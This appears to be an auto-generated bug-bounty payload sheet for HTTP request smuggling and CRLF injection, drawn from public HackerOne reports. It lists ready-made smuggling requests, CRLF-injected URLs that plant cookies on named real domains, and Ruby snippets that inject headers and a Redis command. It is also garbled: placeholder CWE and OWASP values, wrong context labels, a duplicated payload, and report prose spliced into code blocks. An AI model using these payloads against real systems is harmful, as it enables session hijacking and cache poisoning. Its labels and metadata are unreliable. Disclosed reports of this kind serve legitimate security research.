---
vuln_type: "HTTP_Request_Smuggling"
file_type: "payloads"
total_reports: "105"
avg_bounty: "0"
max_bounty: "0"
severity_distribution: "critical:0% high:2% medium:7% low:91%"
owasp_categories: ["A00:2021"]
common_cwe: ["CWE-000"]
last_updated: "2026-04-09"
tags: ["HTTP_Request_Smuggling", "web", "api", "A00", "hunter-kb"]
related_vulns: ["Information_Disclosure", "Broken_Access_Control", "SSRF"]
---

# HTTP Request Smuggling — Payloads

 This payload structure operates reliably against standard implementations lacking modern security boundaries or active request filtering components.
 
> [!TIP]
> Always iterate. Test a canary token to figure out parsing logic, then increment to full payload structures.

> [!WARNING]
> Execute payloads explicitly only against authorized systems in accordance with program SLA scopes.

## Basic Payloads

#### Payload 1

```javascript
https://engineeringblog.yelp.com/xxcrlftest%0d%0aSet-Cookie:%20test=test;domain=.yelp.com
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1002188](https://hackerone.com/reports/1002188)

#### Payload 2

```javascript
GET / HTTP/1.1
Host: localhost:5000
Content-Length : 5

hello
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1063493](https://hackerone.com/reports/1063493)

#### Payload 3

```javascript
require 'net/http'
http = Net::HTTP.new('192.168.30.214','80')
res = http.get("/r.php HTTP/1.1\r\nx-injection: memeda")
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1063627](https://hackerone.com/reports/1063627)

## Context-Specific Payloads

#### Payload 4

```javascript
GET / HTTP/1.1
Transfer-Encoding: chunked
 , identity

1
a
0
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1072277](https://hackerone.com/reports/1072277)

#### Payload 5

```javascript
require 'net/http'

http = Net::HTTP.new('127.0.0.1', 6379)
headers = {
  "test\r\nSET VULN POC \r\n" => "test",
}
resp, data = http.get("/", headers)
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1096609](https://hackerone.com/reports/1096609)

## Advanced Payloads

#### Payload 6

```javascript
GET / HTTP/1.1
Test
set vuln poc
: test
Accept-Encoding:... This report describes a HTTP_Request_Smuggling issue affecting the target application surface. The disclosed finding is titled "Header CRLF Injection in Ruby Net::HTTP" and indicates exploitable input handling weaknesses. Observed report context: There is a Header CRLF Injection vulnerability in Ruby Net::HTTP. When I run the following code:
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1098948](https://hackerone.com/reports/1098948)

#### Payload 7

```javascript
https://vpn.mixmax.com/__session_start__/%0aSet-Cookie:malicious_cookie1
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1108874](https://hackerone.com/reports/1108874)

#### Payload 8

```javascript
https://vpn.bitstrips.com/__session_start__/%0aSet-Cookie:malicious_cookie1

Host: vpn.bitstrips.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0)... This report describes a HTTP_Request_Smuggling issue affecting the target application surface. The disclosed finding is titled "CRLF Injection at vpn.bitstrips.com" and indicates exploitable input handling weaknesses. Observed report context: HI I found that the site https://vpn.bitstrips.com/ is vulnerable to a CRLF Injection. By injecting a Carriage Return and Line Feed character, we are able to make the server issue a set-cookie header. GET Request :
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1120982](https://hackerone.com/reports/1120982)

## WAF Bypass Payloads

#### Payload 9

```javascript
-H 'X-Forwarded-Port: 123' https://www.hackerone.com/index.php?dontpoisoneveryone=1
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1211724](https://hackerone.com/reports/1211724)

## Encoding & Obfuscation

#### Payload 10

```javascript
HTTP/1.1 301 Moved Permanently
...
Location: http://engineeringblog.yelp.com/xxcrlftest
Set-Cookie: test=test;domain=.yelp.com
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1238099](https://hackerone.com/reports/1238099)

## Polyglot Payloads

#### Payload 11

```javascript
/chunked/io
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1238709](https://hackerone.com/reports/1238709)

## Blind / Out-of-Band Payloads

#### Payload 1

```javascript
https://engineeringblog.yelp.com/xxcrlftest%0d%0aSet-Cookie:%20test=test;domain=.yelp.com
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1002188](https://hackerone.com/reports/1002188)

## Chained Payloads

#### Payload 12

```javascript
-Encoding: AAAchunkedBBB
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #146416](https://hackerone.com/reports/146416)

